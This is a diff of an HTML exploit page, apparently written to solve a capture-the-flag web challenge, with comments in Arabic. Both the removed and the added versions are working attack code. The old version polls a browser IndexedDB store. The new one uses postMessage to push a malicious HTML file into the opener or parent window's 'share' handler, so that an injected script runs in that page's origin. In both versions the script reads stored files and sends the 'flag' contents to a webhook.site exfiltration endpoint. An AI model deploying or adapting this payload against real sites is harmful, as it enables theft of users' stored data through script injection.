@@ -1,80 +1,71 @@
-<!-- last_attempt.html -->
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Final attempt: Aggressive Polling</h1>
-  <script>
-    const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
-    
-    // تسجيل كل خطوة
-    const log = (msg) => fetch(`${ATTACKER_SERVER}?log=${encodeURIComponent(msg)}`);
+    <h1>Uploading malicious HTML file to the main application...</h1>
+    <script>
+        // 1. خادم المهاجم لتلقي العلم
+        const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
 
-    const MAX_WAIT_TIME = 30000; // 30 ثانية
-    const POLLING_INTERVAL = 500; // نصف ثانية
-    let elapsedTime = 0;
-    
-    function extractFlag() {
-        log("DB is ready! Attempting to extract flag.");
-        // ... (نفس كود الاستخراج من المحاولات السابقة) ...
-        const dbrequest = indexedDB.open("Files", 1);
-        dbrequest.onsuccess = () => {
-          log("DB opened successfully for extraction.");
-          const db = dbrequest.result;
-          const transaction = db.transaction("files", "readonly");
-          const filesStore = transaction.objectStore("files");
-          const getAllRequest = filesStore.getAll();
-          getAllRequest.onsuccess = () => {
-            log(`Found ${getAllRequest.result.length} objects.`);
-            getAllRequest.result.forEach(obj => {
-              if (obj.file && obj.file instanceof Blob) {
-                obj.file.text().then(text => {
-                  log(`Found blob content: ${text.substring(0, 50)}`);
-                  fetch(`${ATTACKER_SERVER}?flag=${encodeURIComponent(text)}`);
-                });
-              }
-            });
-          };
+        // 2. الكود الخبيث الذي سيتم حقنه داخل ملف HTML.
+        // هذا الكود سيعمل من أصل (Origin) صفحة التحدي نفسها.
+        const malicious_script = `
+            <script>
+                (async () => {
+                    // نستخدم نفس كود استخراج IndexedDB الموثوق به
+                    try {
+                        const dbreq = indexedDB.open('Files', 1);
+                        dbreq.onsuccess = () => {
+                            const db = dbreq.result;
+                            const tx = db.transaction('files', 'readonly');
+                            const store = tx.objectStore('files');
+                            const req = store.getAll();
+                            req.onsuccess = (e) => {
+                                // العلم هو أول ملف يضيفه البوت وهو ليس ملفنا
+                                const flagObject = e.target.result.find(o => o.file.name !== 'pwn.html' && o.file.type === 'text/plain');
+                                if (flagObject) {
+                                    flagObject.file.text().then(flag => {
+                                        // تم العثور على العلم، أرسله!
+                                        fetch('${ATTACKER_SERVER}?flag=' + encodeURIComponent(flag));
+                                    });
+                                }
+                            };
+                        };
+                    } catch(e) {
+                         fetch('${ATTACKER_SERVER}?error=' + encodeURIComponent(e.toString()));
+                    }
+                })();
+            <\/script>
+            <h1>PWNED!</h1>
+        `;
+
+        // 3. بناء الرسالة التي سيتم إرسالها إلى الصفحة الرئيسية
+        const messagePayload = {
+            type: "share",
+            files: [{
+                // نحول كودنا الخبيث إلى Blob من نوع HTML
+                blob: new Blob([malicious_script], { type: "text/html" }),
+                cached: false, // مهم جدًا
+                name: "pwn.html", // نعطيه اسمًا يوحي بأنه ملف HTML
+                isPublic: true // لكي يظهر للجميع فورًا
+            }]
         };
-        dbrequest.onerror = () => log("DB open error during extraction!");
-    }
 
-    function pollForDB() {
-      if (elapsedTime > MAX_WAIT_TIME) {
-        log("Polling timed out.");
-        return;
-      }
-      log(`Polling... elapsed: ${elapsedTime}ms`);
-      
-      try {
-          const dbrequest = indexedDB.open("Files", 1);
-          dbrequest.onsuccess = (event) => {
-            const db = event.target.result;
-            const stores = [...db.objectStoreNames];
-            log(`DB opened. Stores: [${stores.join(', ')}]`);
-            if (stores.includes("files")) {
-              db.close();
-              extractFlag(); // نجحنا
+        // 4. إرسال الرسالة
+        // لا نعرف بالضبط كيف يتم ترتيب النوافذ، لذلك سنحاول عدة طرق
+        // الطريقة الأكثر ترجيحًا هي أن صفحتنا يتم فتحها عبر window.open
+        // وبالتالي فإن صفحة التحدي هي window.opener
+        try {
+            if (window.opener) {
+                // نرسل الرسالة إلى النافذة التي فتحتنا
+                window.opener.postMessage(messagePayload, "*");
             } else {
-              db.close();
-              elapsedTime += POLLING_INTERVAL;
-              setTimeout(pollForDB, POLLING_INTERVAL);
+                 // كحل بديل، نحاول الإرسال إلى النافذة الأصل (إذا كنا في iframe)
+                 window.parent.postMessage(messagePayload, "*");
             }
-          };
-          dbrequest.onerror = (event) => {
-            log(`DB open error while polling: ${event.target.error}`);
-            elapsedTime += POLLING_INTERVAL;
-            setTimeout(pollForDB, POLLING_INTERVAL);
-          }
-      } catch (e) {
-        log(`General error in poll loop: ${e.toString()}`);
-        elapsedTime += POLLING_INTERVAL;
-        setTimeout(pollForDB, POLLING_INTERVAL);
-      }
-    }
-    
-    log("Payload started.");
-    pollForDB();
+        } catch(e) {
+            // قد يحدث خطأ في الوصول إذا كانت الأصول مختلفة، ولكن postMessage يجب أن يعمل
+        }
 
-  </script>
+    </script>
 </body>
 </html>
